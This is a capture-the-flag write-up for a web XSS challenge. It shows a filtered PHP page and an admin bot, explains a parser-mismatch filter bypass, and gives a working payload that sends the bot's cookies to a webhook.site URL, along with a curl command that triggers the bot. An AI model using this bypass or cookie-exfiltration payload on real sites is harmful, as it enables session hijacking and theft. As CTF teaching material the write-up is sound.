+++
title = "Czechoslovakia XSS Challenge | Hackena Ramadan CTF"
date = "2026-03-14"
tags = ["CTF", "Web", "XSS"]
description = "Exploiting XSS in a filtered input parameter using the /a// bypass technique to steal the admin bot's FLAG cookie through webhook exfiltration."
difficulty = 'medium'
+++

> How I Exploited an **XSS** vulnerability in a filtered input parameter using the `/a//` bypass technique to steal the admin bot's FLAG cookie through a webhook exfiltration.

## Components

- **Web App** (`index.php`): Reflects user input inside a `<script>` tag with strict filtering

```php
<?php

function check($input) {
    $whitelist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789;"/';
    $result = '';
    $len = strlen($input);

    if(str_contains($input, '<')){
        return false;
    }
    if(substr_count($input, '"') > 1){
        return false;
    }

    for ($i = 0; $i < $len; $i++) {
        $char = $input[$i];

        if (strpos($whitelist, $char) !== false) {
            $result .= $char;
        }
        else {
            return false;
        }

        if ($char === '/' && isset($input[$i+1]) && $input[$i+1] === '/') {
            if (strpos($result, '"') !== false) {
                break;
            }
            $result .= '//';
            $i++;
        }
    }

    return $result;
}

function remove_all_whitespace(string $s): string {
    return preg_replace('/[\p{Z}\p{C}\s]+/u', '', $s);
}

$name = remove_all_whitespace($_GET['name'] ?? "Guest");

if (!check($name)) {
    $name = "Guest";
}

?>

<h3 id="welcome"></h3>
<script>
document.getElementById("welcome").innerText = "Welcome, <?=$name?>";
</script>
```

- **Admin Bot** (`admin_bot.js`): Bot that visits URLs with a FLAG cookie set

```javascript
const express = require('express');
const puppeteer = require('puppeteer');

const app = express();
const PORT = 3000;

app.use(express.json());

app.post('/visit', async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'Missing url' });

  if (!(url.startsWith('https://web-czechoslovakia.hackena-labs.com/') || url.startsWith('http://web-czechoslovakia.hackena-labs.com/'))) {
    return res.status(400).json({ error: 'Only http(s)://web-czechoslovakia.hackena-labs.com/ allowed' });
  }

  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--no-sandbox', '--disable-dev-shm-usage'],
  });

  const page = await browser.newPage();
  await page.setCookie({
    name: 'FLAG',
    value: process.env.FLAG || 'FLAG_NOT_SET',
    url: 'https://web-czechoslovakia.hackena-labs.com/',
    path: '/',
    secure: false
  });

  try {
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 60000 });
    res.json({ success: true, message: 'Visited successfully' });
  } catch (err) {
    console.error('Error:', err);
    res.status(500).json({ error: 'Automation failed', details: err.message });
  } finally {
    await browser.close();
  }
});

app.listen(PORT,"0.0.0.0", () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
```

Let's start with understanding the code:

**In `index.php`:**

```php
<h3 id="welcome"></h3>
<script>
document.getElementById("welcome").innerText = "Welcome, <?=$name?>";
</script>
```

The name parameter is directly embedded to the JavaScript context without proper validation or encoding.

**In `admin_bot.js`:**

```javascript
await page.setCookie({
    name: 'FLAG',
    value: process.env.FLAG || 'FLAG_NOT_SET',
    url: 'https://web-czechoslovakia.hackena-labs.com/',
});
```

The bot visits any URL in the target domain with the FLAG cookie set.

### Understanding the filters

The application implements TWO layers of filtering:

**Filter Layer 1: Whitespace Removal**

```php
function remove_all_whitespace(string $s): string {
    return preg_replace('/[\p{Z}\p{C}\s]+/u', '', $s);
}
```

Removes ALL whitespace characters including: spaces, tabs, newlines, unicode whitespace, control characters.

**Filter Layer 2: Character Whitelist & Logic**

```php
function check($input) {
    $whitelist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789;"/';

    if(str_contains($input, '<')) return false;
    if(substr_count($input, '"') > 1) return false;

    for ($i = 0; $i < $len; $i++) {
        $char = $input[$i];
        if (strpos($whitelist, $char) === false) return false;

        if ($char === '/' && isset($input[$i+1]) && $input[$i+1] === '/') {
            if (strpos($result, '"') !== false) break;
        }
    }
    return $result;
}
```

### Summary of Constraints:

- **No `<`** → Cannot use HTML tags | Blocks `<script>`, `<img>`, etc.
- **Max 1 `"`** → Only one double quote, Limits string escaping options
- **Whitelist only →** Letters, digits, `;`, `"`, `/` Blocks parentheses, dots, special chars, etc.
- **No whitespace** → All spaces removed, Must write JavaScript without spaces
- **`//` stops after `"`** → Processing ends at `//` if `"` exists before it **KEY LOOPHOLE!**

### The core trick in the challenge (Parser Mismatch)

The filter and JavaScript parser interpret the **same text differently**. Here's why:

**From the PHP perspective:**
Input: `";/a//(malicious_code)//`
`"` → quote found → `;`, `/` , `a`, `/` → Valid characters → `/` → This is the second slash!, the server check if there was a `"` before and yes so the assumption → Everything after `//` is a comment (safe) so stop validation.

**From the JavaScript perspective:**

```javascript
document.getElementById("welcome").innerText = "Welcome, ";/a//(malicious_code)//";
```

- `"` → String literal
- `;` → Statement terminator
- `/a/` → Valid regex literal (harmless by itself).
- `//` → Looks like the start of a comment, but only after the parser has already accepted `/a/` as a complete expression.
- `(malicious_code)` → Treated as a new expression, so it executes.
- `//` → Starts a comment

After all this, let's confirm our approach is true by trying to make an alert: `?name=";/a//(alert(1))//` and doneeeee

Now I should build the full exploit to steal the flag.

After skipping the filter by `";/a//` the following code is that we will steal the flag with. The intended path is to make the admin_bot visit the URL and then will send the flag back as a cookie.

We can receive the cookie in a listener like **webhook**, So the exploit will be:

```javascript
(window.location='https://webhook.site/YOUR_ID/?c='.concat(btoa(document.cookie)))
```

- `document.cookie` — Retrieves all cookies (including FLAG)
- `btoa(document.cookie)` — Base64 encodes the cookie data
- `.concat()` — Appends the encoded data to our URL
- `window.location=` — Redirects to our webhook, exfiltrating the data

**The final payload:**

```
";/a//(window.location='https://webhook.site/YOUR_ID/?c='.concat(btoa(document.cookie)))//
```

The Exploitation Steps:

1. Encode the payload
2. `https://web-czechoslovakia.hackena-labs.com/?name=<ENCODED_PAYLOAD>`
3. Make the bot visit the URL by sending a request to **visit** endpoint:

```bash
curl -X POST https://web-czechoslovakia-bot.hackena-labs.com/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "https://web-czechoslovakia.hackena-labs.com/?name=<ENCODED_PAYLOAD>"}'
```

4. Receive the flag in your webhook and decode it.

DONE FOR THE DAY — SEE YOU IN ANOTHER CHALLENGE ;)
